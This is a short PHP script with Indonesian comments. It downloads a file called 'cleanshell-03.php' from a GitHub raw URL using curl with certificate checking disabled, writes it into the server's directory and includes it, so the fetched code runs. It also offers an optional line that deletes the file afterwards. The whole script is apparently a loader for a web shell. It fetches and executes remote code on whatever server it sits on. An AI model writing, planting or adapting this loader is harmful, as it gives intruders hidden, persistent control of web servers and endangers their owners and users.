<?php

// ========== CONFIG ==========
// URL RAW GITHUB yang benar (HARUS RAW LINK)
$remote_file = "https://raw.githubusercontent.com/onlyme1d/dxerror/main/cleanshell-03.php";

// Lokasi penyimpanan sementara di server
$temp_file = __DIR__ . "/_remote_run.php";
// ============================


// Ambil file dari GitHub menggunakan cURL
function fetchRemoteFile($url) {
    if (!function_exists('curl_version')) {
        die("ERROR: cURL tidak tersedia di server.");
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $data = curl_exec($ch);

    if (curl_errno($ch)) {
        die("CURL ERROR: " . curl_error($ch));
    }

    curl_close($ch);
    return $data;
}

// Ambil konten dari GitHub
$content = fetchRemoteFile($remote_file);

// Jika gagal ambil
if (!$content) {
    die("ERROR: Tidak bisa mengambil file dari GitHub.");
}

// Tulis ke file sementara
file_put_contents($temp_file, $content);

// Include file yang sudah diambil
include $temp_file;

// Optional: Hapus file setelah dijalankan
// unlink($temp_file);

?>
